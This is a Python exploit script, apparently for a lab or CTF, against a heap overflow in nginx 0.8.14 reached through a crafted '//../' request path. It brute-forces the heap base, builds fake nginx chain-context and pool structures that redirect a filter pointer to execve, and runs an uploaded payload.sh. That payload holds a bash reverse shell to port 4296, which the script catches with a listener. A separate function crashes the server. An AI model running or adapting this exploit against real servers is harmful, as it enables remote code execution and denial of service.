#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import urllib
from joblib import Parallel, delayed

bin_file = './nginx-0.8.14_amd64'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

target = {'host':'localhost', 'port':8080}

#==========

binf = ELF(bin_file)
addr_plt_execve     = binf.plt['execve']
addr_ssi_filter     = binf.sep_function['ngx_http_ssi_body_filter']

offset_heap_buffer  = 0x09000
offset_heap_req     = offset_heap_buffer + 0x0e20
offset_heap_ctx     = offset_heap_buffer + 0xdab0

# addr_heap_base      = 0x019a4000
addr_heap_base      = 0

#==========

def attack(conn, **kwargs):
    # payload.sh
    '''
    #!/bin/bash
    bash -i >& /dev/tcp/localhost/4296 0>&1
    '''

    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))
    req = gen_request('/var/www/html/upload/payload.sh')
    conn.send(req)

def gen_request(prog, ofs = 0):
    addr_buffer = addr_heap_base + offset_heap_buffer
    addr_req    = addr_heap_base + offset_heap_req
    addr_ctx    = addr_heap_base + offset_heap_ctx

    fake_ngx_output_chain_ctx_t  = p64(0)*4
    fake_ngx_output_chain_ctx_t += p8(0)*5
    fake_ngx_output_chain_ctx_t += 'x'*3
    fake_ngx_output_chain_ctx_t += p64(0x200)               # alignment
    fake_ngx_output_chain_ctx_t += p64(addr_buffer + 0x80)  # pool
    fake_ngx_output_chain_ctx_t += p64(0)*4
    fake_ngx_output_chain_ctx_t += p64(addr_plt_execve)     # output_filter
    fake_ngx_output_chain_ctx_t += p64(addr_req + ofs)      # filter_ctx

    fake_ngx_pool_t  = p64(addr_buffer + 0x80+0x50) # d.last
    fake_ngx_pool_t += p64(0)*3
    fake_ngx_pool_t += p64(0x1000)                  # max
    fake_ngx_pool_t += p64(addr_buffer + 0x80)      # current

    exploit  = 'x'*0xf
    exploit += fake_ngx_output_chain_ctx_t
    exploit  = exploit.ljust(0x80-1, '\x00')
    exploit += fake_ngx_pool_t
    exploit  = exploit.ljust(0x80+0x50-1, '\x00')
    exploit  = exploit.ljust(0x220-1, 'y')
    exploit += p64(0)*0x1e
    exploit += p64(addr_buffer + 0x10)

    exploit  = urllib.quote(exploit).replace('/', '%2f')

    req  = '''
GET //../{} HTTP/1.1\r
Host: localhost\r
X-Exec-Program: {}
    '''.format(exploit, prog).strip()
    req += '\r\n\r\n'

    if ofs == 0:
        req = gen_request(prog, req.find(prog))

    return req

def detect_heap(start):
    if addr_heap_base > 0:
        return

    comn = Communicate('SOCKET', quiet=True, **target)
    comn.connect()
    with log.progress('Detecting heap base address... ') as p:
        comn.repeat(try_heap, 1, range(start, start+0x100), log=p)

def try_heap(conn, **kwargs):
    global addr_heap_base
    if addr_heap_base > 0:
        return

    cand_heap_base = kwargs['rep_arg'][0] << 12
    addr_buffer = cand_heap_base + offset_heap_buffer
    addr_ctx    = cand_heap_base + offset_heap_ctx

    kwargs['log'].status("Trying 0x%08x" % cand_heap_base)

    fake_ngx_output_chain_ctx_t  = p64(0)*4
    fake_ngx_output_chain_ctx_t += p8(0)*5
    fake_ngx_output_chain_ctx_t += 'x'*3
    fake_ngx_output_chain_ctx_t += p64(0x200)               # alignment
    fake_ngx_output_chain_ctx_t += p64(addr_buffer + 0x80)  # pool
    fake_ngx_output_chain_ctx_t += p64(0)*4
    fake_ngx_output_chain_ctx_t += p64(addr_ssi_filter)     # output_filter
    fake_ngx_output_chain_ctx_t += p64(addr_ctx)            # filter_ctx

    fake_ngx_pool_t  = p64(addr_buffer + 0x80+0x50) # d.last
    fake_ngx_pool_t += p64(0)*3
    fake_ngx_pool_t += p64(0x1000)                  # max
    fake_ngx_pool_t += p64(addr_buffer + 0x80)      # current

    exploit  = 'x'*0xf
    exploit += fake_ngx_output_chain_ctx_t
    exploit  = exploit.ljust(0x80-1, '\x00')
    exploit += fake_ngx_pool_t
    exploit  = exploit.ljust(0x80+0x50-1, '\x00')
    exploit  = exploit.ljust(0x220-1, 'y')
    exploit += p64(0)*0x1e
    exploit += p64(addr_buffer + 0x10)

    exploit  = urllib.quote(exploit).replace('/', '%2f')

    req  = '''
GET //../{} HTTP/1.1\r
Host: localhost\r
    '''.format(exploit).strip()
    req += '\r\n\r\n'

    conn.send(req)
    conn.recv()

    addr_heap_base = cand_heap_base

def kill_server():
    comn = Communicate('SOCKET', quiet=True, **target)
    comn.connect()

    req  = '''
GET //../{} HTTP/1.1\r
Host: localhost\r
    '''.format('a'*0x300).strip()
    req += '\r\n\r\n'

    comn.connection.send(req)

#==========

if __name__=='__main__':
    p = Parallel(n_jobs=-1, backend="threading")
    d = delayed(detect_heap)
    p(d(i*0x100) for i in range(0,0x20))

    if addr_heap_base == 0:
        error('Detect heap base address failed')

    kill_server()

    comn = Communicate('SOCKET', **target)
    comn.connect()
    l = listen(4296)

    comn.run(attack)
    l.interactive()

#==========
